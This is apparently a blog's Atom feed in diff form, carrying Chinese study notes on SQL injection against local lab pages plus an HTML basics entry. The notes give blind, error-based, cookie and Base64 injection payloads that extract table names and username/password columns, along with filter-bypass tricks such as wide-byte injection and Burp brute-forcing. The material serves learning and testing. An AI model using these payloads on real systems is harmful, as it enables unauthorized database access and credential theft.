substr(database(),1,1)=’a’–+</p><p>*substr为数据库的一种函数，它的作用是从一个字符串截取一部分返回。</p><p>*database()后面的1,1表示这个字符串的第一个字符，2,1表示第二个字符。</p><p>*此语句执行一次只能判断一个字符，需要结合Burp狙击手来爆破。</p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://172.16.13.55/web/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1&#39;</a> and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’a’–+</p><p>*limit 0,1表示从第几个字符串开始。例如，数据库中依次有person，user，password 三个表，0,1表示从person开始读取，1,1就表示从user读取。</p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://172.16.13.55/web/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1&#39;</a> and substr((select column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 0,1),1,1)=’a’–+</p><h1 id="爆数值："><a href="#爆数值：" class="headerlink" title="爆数值："></a>爆数值：</h1><p><a href="http://172.16.13.55/web/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1&#39;</a> and substr((select id from test.users limit 0,1),1,1)=’a’–+</p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*当判断页面注入类型时，若页面只返回正确和错误，不返回报错信息时，只能采用盲注的方式。</p><p>*盲注执行一次代码判断的是一个字符，手工输入很消耗精力，需要用到Burp的狙击手来帮助，使用方式见SQL注入基本知识-利用Burp进行盲注。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;例：&lt;a href=&quot;http://172.16.13.55/web/boolean.php?id=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.16.13.55/web/boolean.php?id=1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;*
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>报错注入</title>
+    <link href="http://yoursite.com/2019/08/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2019/08/09/报错注入/</id>
+    <published>2019-08-09T14:47:44.674Z</published>
+    <updated>2019-08-09T14:59:38.097Z</updated>
+    
+    <content type="html"><![CDATA[<p>例：<a href="http://172.16.13.53/web/error.php" target="_blank" rel="noopener">http://172.16.13.53/web/error.php</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://172.16.13.53/web/error.php?username=a&#39;" target="_blank" rel="noopener">http://172.16.13.53/web/error.php?username=a&#39;</a> and updatexml(1,concat(0x7e,(database()),0x7e),1)–+</p><p>*updatexml语法格式为以上形式</p><p>*0x7e转义过来是波浪符号~</p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://172.16.13.53/web/error.php?username=a&#39;" target="_blank" rel="noopener">http://172.16.13.53/web/error.php?username=a&#39;</a> and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),0x7e),1)–+</p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://172.16.13.53/web/error.php?username=a&#39;" target="_blank" rel="noopener">http://172.16.13.53/web/error.php?username=a&#39;</a> and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’),0x7e),1)–+</p><h1 id="爆数值："><a href="#爆数值：" class="headerlink" title="爆数值："></a>爆数值：</h1><p><a href="http://172.16.13.53/web/error.php?username=a&#39;" target="_blank" rel="noopener">http://172.16.13.53/web/error.php?username=a&#39;</a> and updatexml(1,concat(0x7e,(select group_concat(username,password) from test.users ),0x7e),1)–+</p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*报错注入的条件是页面能返回报错的信息，能从报错信息中得到有用信息</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;例：&lt;a href=&quot;http://172.16.13.53/web/error.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.16.13.53/web/error.php&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;*判断注入点及类型，见SQL注
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL注入绕过技巧</title>
+    <link href="http://yoursite.com/2019/08/09/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
+    <id>http://yoursite.com/2019/08/09/SQL注入绕过技巧/</id>
+    <published>2019-08-09T14:47:44.671Z</published>
+    <updated>2019-08-09T14:59:06.691Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="大小写绕过："><a href="#大小写绕过：" class="headerlink" title="大小写绕过："></a>大小写绕过：</h1><p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。</p><p>例如：id=1 UNion SElecT  1,2,3</p><h1 id="替换关键字："><a href="#替换关键字：" class="headerlink" title="替换关键字："></a>替换关键字：</h1><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过。</p><p>例如：id=1 UNIunionON SELselectECT 1,2,3</p><h1 id="空格绕过："><a href="#空格绕过：" class="headerlink" title="空格绕过："></a>空格绕过：</h1><p>有些情况SQL会过滤空格，使得空格无法生效，可以用一下方式绕过。</p><p>例如：</p><p>id=1<code>/**/</code>union<code>/**/</code>select<code>/**/</code>1,2,3    //用<code>/**/</code>代替空格</p><p>id=1%0aunion%a0select%a01,2,3             //用%0a(回车)代替空格</p><p>id=1()union()select()1,2,3                           //用()代替空格</p><p>……</p><h1 id="引号绕过（用16进制）："><a href="#引号绕过（用16进制）：" class="headerlink" title="引号绕过（用16进制）："></a>引号绕过（用16进制）：</h1><p>会使用到引号的地方一般是在最后的where子句中，如select column_name  from information_schema.tables where table_name=’users’</p><p>将’users’转变为16进制为0x7573657273</p><h1 id="逗号绕过："><a href="#逗号绕过：" class="headerlink" title="逗号绕过："></a>逗号绕过：</h1><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。</p><h6 id="使用from-for绕过（substr-和mid-可以使用-："><a href="#使用from-for绕过（substr-和mid-可以使用-：" class="headerlink" title="使用from for绕过（substr()和mid()可以使用)："></a>使用from for绕过（substr()和mid()可以使用)：</h6><p>例：id=1 and substr(database(),1,1)=’a’</p><p>​        id=1 and substr(database() from 1 for 1)=’1’</p><h6 id="使用join绕过："><a href="#使用join绕过：" class="headerlink" title="使用join绕过："></a>使用join绕过：</h6><p>union select 1,2等价于union select * from (select 1)a join (select 2)b</p><h6 id="使用like："><a href="#使用like：" class="headerlink" title="使用like："></a>使用like：</h6><p>select ascii(mid(user(),1,1))=80等价于select user() like ‘r%’</p><h6 id="对于limit可以使用offset来绕过："><a href="#对于limit可以使用offset来绕过：" class="headerlink" title="对于limit可以使用offset来绕过："></a>对于limit可以使用offset来绕过：</h6><p>select * from news limit 0,1等价于select * from news limit 1 offset 0</p><h1 id="比较符号绕过（’-gt-’-’-lt-’-’-’）："><a href="#比较符号绕过（’-gt-’-’-lt-’-’-’）：" class="headerlink" title="比较符号绕过（’&gt;’,’&lt;’,’=’）："></a>比较符号绕过（’&gt;’,’&lt;’,’=’）：</h1><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。</p><h6 id="用greatest，least代替大于小于符号："><a href="#用greatest，least代替大于小于符号：" class="headerlink" title="用greatest，least代替大于小于符号："></a>用greatest，least代替大于小于符号：</h6><p>例：id=1 and length(database())&gt;2</p><p>​        id=1 and greatest(length(database()),2)=2</p><p>​        *greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p><h6 id="使用between-and："><a href="#使用between-and：" class="headerlink" title="使用between and："></a>使用between and：</h6><p>*between a and b：返回a，b之间的数据，不包含b。</p><h6 id="绕过等号："><a href="#绕过等号：" class="headerlink" title="绕过等号："></a>绕过等号：</h6><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h1 id="or-and-xor-not绕过："><a href="#or-and-xor-not绕过：" class="headerlink" title="or and xor not绕过："></a>or and xor not绕过：</h1><p>有些时候SQL会过滤上述的关键字，导致输入的关键字不能执行。</p><h6 id="使用大小写、替换关键字绕过："><a href="#使用大小写、替换关键字绕过：" class="headerlink" title="使用大小写、替换关键字绕过："></a>使用大小写、替换关键字绕过：</h6><p>id=1 and 1=1等价于id=1 aandnd 1=1</p><p>id=1 and 1=1等价于id=1 ANd 1=1</p><h6 id="使用字符代替："><a href="#使用字符代替：" class="headerlink" title="使用字符代替："></a>使用字符代替：</h6><p>or=||    </p><p>and=&amp;&amp;    </p><p>xor=|    </p><p>not=!</p><h1 id="注释符号绕过："><a href="#注释符号绕过：" class="headerlink" title="注释符号绕过："></a>注释符号绕过：</h1><p>一般常用注释符号有#，–+，– ，– -等，但是SQL如果过滤了这些注释符，就会使得注释无效。</p><p>例：id=1’ union select 1,2,3</p><p>id=1’ union select 1,2,3||’1或者id=1’ union select 1,2,’3</p><p>*单引号的作用是将后面的单引号闭合掉</p><h1 id="内联绕过："><a href="#内联绕过：" class="headerlink" title="内联绕过："></a>内联绕过：</h1><p>例如，一个函数过滤了select关键字，双写，大小写等方法都不奏效，这时可以使用内联绕过。</p><p>id=1 union select 1,database(),3</p><p>这里可以用<code>/*!select*/</code>代替select，<code>/*！*/</code>中的内容将强制执行</p><h1 id="通用编码绕过："><a href="#通用编码绕过：" class="headerlink" title="通用编码绕过："></a>通用编码绕过：</h1><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><p>or 1=1即为%6f%72%20%31%3d%31</p><h1 id="等价函数绕过："><a href="#等价函数绕过：" class="headerlink" title="等价函数绕过："></a>等价函数绕过：</h1><p>SQL若过滤了每个函数导致函数不能使用，可以寻找它的等价函数来替代当前函数。</p><p>hex()、bin() ==&gt; ascii()</p><p>sleep() ==&gt;benchmark()</p><p>concat_ws()==&gt;group_concat()</p><p>mid()、substr() ==&gt; substring()</p><h1 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h1><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。</p><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路。</p><p>1、%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：id=-1%df%27union select 1,user(),3–+　　</p><p>2、将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p><h6 id="一般产生宽字节注入的PHP函数："><a href="#一般产生宽字节注入的PHP函数：" class="headerlink" title="一般产生宽字节注入的PHP函数："></a>一般产生宽字节注入的PHP函数：</h6><p>   1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 &#39; ，将 \  转为 \，将 “ 转为 &quot; 。用思路一。</p><p>   2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p><p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p><p>3.mysql_real_escape_string()：转义下列字符：\x00     \n     \r     \     ‘     “     \x1a</p><p>（防御方法，将mysql编码方式设置为gbk即可）</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;大小写绕过：&quot;&gt;&lt;a href=&quot;#大小写绕过：&quot; class=&quot;headerlink&quot; title=&quot;大小写绕过：&quot;&gt;&lt;/a&gt;大小写绕过：&lt;/h1&gt;&lt;p&gt;此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。&lt;/
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL注入基本知识</title>
+    <link href="http://yoursite.com/2019/08/09/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
+    <id>http://yoursite.com/2019/08/09/SQL注入基本知识/</id>
+    <published>2019-08-09T14:47:44.668Z</published>
+    <updated>2019-08-09T14:59:03.520Z</updated>
+    
+    <content type="html"><![CDATA[<p>例：<a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a></p><h1 id="SQL注入概念："><a href="#SQL注入概念：" class="headerlink" title="SQL注入概念："></a>SQL注入概念：</h1><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><h1 id="SQL注入原理："><a href="#SQL注入原理：" class="headerlink" title="SQL注入原理："></a>SQL注入原理：</h1><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p><p>根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：</p><p>①不当的类型处理；</p><p>②不安全的数据库配置；</p><p>③不合理的查询集处理；</p><p>④不当的错误处理；</p><p>⑤转义字符处理不合适；</p><p>⑥多个提交处理不当。</p><h1 id="判断注入类型（整型）："><a href="#判断注入类型（整型）：" class="headerlink" title="判断注入类型（整型）："></a>判断注入类型（整型）：</h1><p>id=1    页面正常</p><p>id=1 and 1=1    页面正常</p><p>id=1 and 1=2    页面报错</p><p>*从以上三个条件可以判断该页面存在sql注入，并且为整型</p><h1 id="判断注入类型（字符型）："><a href="#判断注入类型（字符型）：" class="headerlink" title="判断注入类型（字符型）："></a>判断注入类型（字符型）：</h1><p> id=1    页面正常</p><p>id=1 and 1=1    页面正常</p><p>id=1 and 1=2    页面正常</p><p>id=1’ and 1=1#    页面正常</p><p>id=1’ and 1=2#    页面报错</p><p>*从以上五个条件可以判断该页面存在sql注入，并且为字符型</p><h1 id="判断注入类型（时间盲注）："><a href="#判断注入类型（时间盲注）：" class="headerlink" title="判断注入类型（时间盲注）："></a>判断注入类型（时间盲注）：</h1><p>*时间盲注在任何时候不会报错，也不会出现任何有用信息</p><p>*id=1’ and sleep(5) –+：若页面响应时间延迟，可以判断存在哪种注入</p><h1 id="常用注释符："><a href="#常用注释符：" class="headerlink" title="常用注释符："></a>常用注释符：</h1><p>#，–+，– ，– -等，或者可以将字符转换成对应的URL</p><h1 id="利用Burp进行盲注："><a href="#利用Burp进行盲注：" class="headerlink" title="利用Burp进行盲注："></a>利用Burp进行盲注：</h1><p>布尔盲注指页面只返回true和false两个结果，并没有返回报错等有用信息</p><p>以爆破数据库为例：1’ and substr(database(),1,1)=’a’–+</p><p>1、用Burp进行拦截抓包</p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564574623139.png" alt="1564574623139"></p><p>2、右键-发送给测试器</p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564574681927.png" alt="1564574681927"></p><p>3、清除§-添加§</p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564574761138.png" alt="1564574761138"></p><p>​    *清除§之后，添加的位置为要变动的值，如上面的’a’</p><p>4、有效载荷-从列表中添加</p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564574923277.png" alt="1564574923277"></p><p>​    *字典除了Burp自带的一些简单字典外，还可以选择外部的字典。</p><p>5、开始攻击</p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564575056149.png" alt="1564575056149"></p><p>​    *攻击会自动遍历字典里的值，正确的值在返回的字符长度上和错误值不相同，这样就可以确认具体字符。</p><p>​    *若是时间盲注，正确和错误信息返回的长度都是一样的，此时需要看数据返回时间，具体操作：列-接收响应计数。</p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564575293869.png" alt="1564575293869"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;例：&lt;a href=&quot;http://127.0.0.1/web/union.php?id=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://127.0.0.1/web/union.php?id=1&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&quot;SQL注入概
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Cookie注入</title>
+    <link href="http://yoursite.com/2019/08/09/Cookie%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2019/08/09/Cookie注入/</id>
+    <published>2019-08-09T14:47:44.579Z</published>
+    <updated>2019-08-09T14:58:25.415Z</updated>
+    
+    <content type="html"><![CDATA[<p>例：<a href="http://172.16.13.29/web/cookie.php" target="_blank" rel="noopener">http://172.16.13.29/web/cookie.php</a></p><h1 id="利用Burp抓包："><a href="#利用Burp抓包：" class="headerlink" title="利用Burp抓包："></a>利用Burp抓包：</h1><p>*抓包后发送到重发器，然后在重发器的cookie值后面构造语句</p><h1 id="在重发器中构造语句"><a href="#在重发器中构造语句" class="headerlink" title="在重发器中构造语句:"></a>在重发器中构造语句:</h1><p>*这里和其他注入方式一样，只不过语句是在Burp的重发器中构造的</p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提交了，而一般的注入我们是使用get或者post方式提交，get方式提交就是直接在网址后面加上需要注入的语句，post则是通过表单方式，get和post的不同之处就在于一个我们可以通过IE地址栏处看到我们提交的参数，而另外一个却不能。</p><p>*相对post和get方式注入来说，cookie注入就要稍微繁琐一些了，要进行cookie注入，我们首先就要修改cookie，这里就需要使用到Javascript语言了。另外cookie注入的形成有两个必须条件，条件1是：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。条件2是：在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;例：&lt;a href=&quot;http://172.16.13.29/web/cookie.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.16.13.29/web/cookie.php&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&quot;利用Burp抓包
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>BASE64注入</title>
+    <link href="http://yoursite.com/2019/08/09/Base64%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2019/08/09/Base64注入/</id>
+    <published>2019-08-09T14:47:44.577Z</published>
+    <updated>2019-08-09T14:58:21.749Z</updated>
+    
+    <content type="html"><![CDATA[<p>例：<a href="http://172.16.13.29/web/base64.php" target="_blank" rel="noopener">http://172.16.13.29/web/base64.php</a></p><h1 id="语句编码："><a href="#语句编码：" class="headerlink" title="语句编码："></a>语句编码：</h1><p>*base64注入的原理是将构造语句进行base64编码，例如id=1，这里把等号后面的内容变成Base64的编码方式，意思就是1→MQ==，在整个注入过程的构造语句都编码成Base64，视具体情况，还可编码成url等其他编码方式。</p><p>*注入过程与其他主流的注入方式相同。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;例：&lt;a href=&quot;http://172.16.13.29/web/base64.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.16.13.29/web/base64.php&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&quot;语句编码：&quot;&gt;&lt;
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HTML基础</title>
+    <link href="http://yoursite.com/2019/08/09/HTML%E5%9F%BA%E7%A1%80/"/>
+    <id>http://yoursite.com/2019/08/09/HTML基础/</id>
+    <published>2019-08-09T14:47:28.360Z</published>
+    <updated>2019-08-09T14:58:39.145Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="HTML基本介绍"><a href="#HTML基本介绍" class="headerlink" title="HTML基本介绍"></a>HTML基本介绍</h1><h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>HTML是超文本标记语言，不是传统定义的编程语言，又是一种标准结构化语言。</p><p>HTML是构建我们一个标准的网页标准语言，它定义一套严格标签、内容、方法等规范。</p><h2 id="基本格式："><a href="#基本格式：" class="headerlink" title="基本格式："></a>基本格式：</h2><p><input name="zhangsan" id="username" value onchange="javascript:;">       </p><p>&lt;标签   属性名=’属性值’    onclick onxxx=方法&gt;内容（元素）&lt;/标签&gt;</p><h2 id="发展历史："><a href="#发展历史：" class="headerlink" title="发展历史："></a>发展历史：</h2><p>HTML发展了5代，目前兼容或运行的HTML（4-5），浏览器多为双核心浏览器（高速：webkit/兼容：IE/Edge）</p><h2 id="基本组成："><a href="#基本组成：" class="headerlink" title="基本组成："></a>基本组成：</h2><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564487787373.png" alt="1564487787373"></p><p>HTML和Head是系统级，不显现，Head中的内容是可对影响的浏览器本身的，它具有对浏览器的控制权限，只有Body才会显现。</p><p>优先级：HTML&gt;Head&gt;Body&gt;元素</p><p>HTML：网页基础结构，必不可少，如果不写，浏览器在渲染时会自动补全，该标签具有很高的优先级，因此会多跟浏览器本身的可视区域形成一种关联关系。</p><p>Head：网页基础结构的组成标签，原则上不可少，有些浏览器不会自动补全该标签，该标签的优先级受限于HTML。</p><p>Body：网页基础结构的组成标签，原则上可以不写，但是一定会自动不全该标签,他的可视区域受限于HTML。</p><p>浏览器两个基本组件：一个解释器（告诉浏览器标签的作用和级别），一个渲染器（转化成UI界面）。</p><h2 id="HTML版本-规范："><a href="#HTML版本-规范：" class="headerlink" title="HTML版本/规范："></a>HTML版本/规范：</h2><p>HTML                               1991</p><p>HTML+                             1993</p><p>HTML 2.0</p><p>HTML 3.0</p><p>HTML 4.0                      （不存在）</p><p>HTML 4.01                       1999</p><p>XHTML 1.0（微软）      2000</p><p>HTML 5                             2012</p><p>XHTML 5（微软）          2013</p><h2 id="识别HTML版本-规范方法："><a href="#识别HTML版本-规范方法：" class="headerlink" title="识别HTML版本/规范方法："></a>识别HTML版本/规范方法：</h2><!doctype><p>声明HTML的版本/规范<br>声明没有具体的大小写要求，可以全大写也可以全小写<br>HTML 5: <!doctype html><br>HTML 4.01: <!doctype HTML Public “-//w3c//DTD HTML 4.1 Transitional //EN” “**html4/xxx.dtd”><br>XHTML 1.0: <!doctype HTML Public “-//w3c//DTD HTML 1.0 Transitional //EN” “**xhtml1/xxx.dtd”></p><p>*微软与W3C之争：争夺规范和话语权，微软是在W3C基础上增加了自己的一些内容：自有标签库/方法库/属性库。还增加了浏览器的解释和渲染的规范和话语权：IE5/6（HTML&lt;4.01） IE7/8/9（HTML&gt;4.01&lt;XHTML1.0） IE10/11(HTML5/XHTML5)<br>浏览器的份额发生变化导致微软的IE份额下滑，最后是由苹果和谷歌联合推动webkit内核胜利。</p><h2 id="Head区域："><a href="#Head区域：" class="headerlink" title="Head区域："></a>Head区域：</h2><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564488598583.png" alt="1564488598583"></p><p>Meta标签是头功能定义：定义编码/缩放比例<br>Title 页面标题定义，也是唯一一个可以直观感受到HTML<br>Script 脚本<br>Style  样式<br>Link  引用标签</p><h2 id="Body区域："><a href="#Body区域：" class="headerlink" title="Body区域："></a>Body区域：</h2><p>各类Tags<br>按功能划分：</p><p>​            1、容器标签：常用的div，p，span<br>​            2、内容标签：常用的div，p，span，input，textarea，video，audio，img<br>​            3、交互标签:  常用的input，button，a<br>标签的套路（规则）<br>标准写法：&lt;标签名 属性 方法&gt;&lt;/标签名&gt;<br>简易写法：&lt;标签名 内容属性支持/&gt;<br>标签名：A-Z（百度html标签）<br>div特性：独占一行(width：100%)，没有行高（height：0/none），没有边框（border：0/none）……</p><p>属性：<br>     通用标签：id name style class width height data<br>     特有标签：src rel value<br>     自定义：多配合JS用<br>方法：可以通过关键字this来获得安全列表<br>安全问题：有一些安全事件是采用改变或拦截标签后给它赋予一些方法，来获得内容</p><p>常见的界面布局：H/工 I/i T 口 国 框……<br>页面布局原则：先布局再内容</p><h2 id="HTML标签特点："><a href="#HTML标签特点：" class="headerlink" title="HTML标签特点："></a>HTML标签特点：</h2><p>1、    成对出现<a></a> <b></b><br>2、    最大化写法：标签名  属性名   方法名  内容  最小化写法：<div></div>(只有基本内容的一个或多个，必须要有的是标签名) 特殊写法：不带尖括号 ：before<br>3、    标签一般依赖于body标签</p><h2 id="常用标签："><a href="#常用标签：" class="headerlink" title="常用标签："></a>常用标签：</h2><h4 id="1、容器标签："><a href="#1、容器标签：" class="headerlink" title="1、容器标签："></a>1、容器标签：</h4><div>块级标签：独占一行、没有行高（没有内容时）、没有边框、position：属性会重写，原点定位：左上角</div>移动一个DIV：top left right bottom这四个属性基于position，如left：100px，不表示向左移动100px ，而是移动后的位置距离左边100px<p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564489002607.png" alt="1564489002607"></p><p>*<span></span>:</p><p>将一行分为多个小节/段，方向是横向分段，段的长度默认为0，长度可以有内容来定义，也可以由width定义（4.01版本以前才适用）</p><p>*</p><p></p>：<p></p><p>段落标签，与span类似，但是是纵向的分段。</p><p>*<table></table>：</p><p>表格标签  <tr>表示表格的一行   <td>表示表格的一列  <th>表示表头</th></td></tr></p><p>*</p><h1>一号字</h1>   *<h4>四号字</h4>：<p></p><p>字体大小标签</p><p>&lt;*br/&gt;：</p><p>换行标签</p><p>*<hr>：</p><p>生成水平线</p><p>*<form></form>：</p><p>表单</p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564497635178.png" alt="1564497635178"></p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564497644352.png" alt="1564497644352"></p><p>&lt;*button&gt;按钮：</p><p>*<textarea maxlength="1">多行文本框</textarea></p><select> <option value="“a”">one</option><option>two</option></select><p>下拉菜单</p><p><lable>标注标签</lable></p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564497825314.png" alt="1564497825314"></p><h4 id="2、-格式标签："><a href="#2、-格式标签：" class="headerlink" title="2、 格式标签："></a>2、 格式标签：</h4><p>&lt;<em>b&gt;加粗<br>&lt;</em>i&gt;斜体</p><p>*<bdo dir="ltr">abc</bdo>  结果为cba<br>*<blockquote>块引用</blockquote></p><p>&lt;<em>em&gt;强调</em><br><font size="20" color="red"><em>字体</em></font><br>&lt;del&gt;文字划横线<br>文字&lt;<em>sub&gt;下标<br>文字&lt;</em>sup&gt;下标<br>&lt;<em>ruby&gt;<br>好<rt>hao</rt><br><br>&lt;</em>small&gt;小号字体<br>&lt;<em>strong&gt;强调字体<br>&lt;</em>u&gt;下划线</p><h4 id="3、框架："><a href="#3、框架：" class="headerlink" title="3、框架："></a>3、框架：</h4><p>&lt;*iframe src=”<a href="http://www.baidu.com”&gt;4.01，" target="_blank" rel="noopener">http://www.baidu.com”&gt;4.01，</a></p><frame>框架最早定义，框架区域或窗口<frameset></frameset><h4 id="4、图像标签："><a href="#4、图像标签：" class="headerlink" title="4、图像标签："></a>4、图像标签：</h4><p>&lt;*img 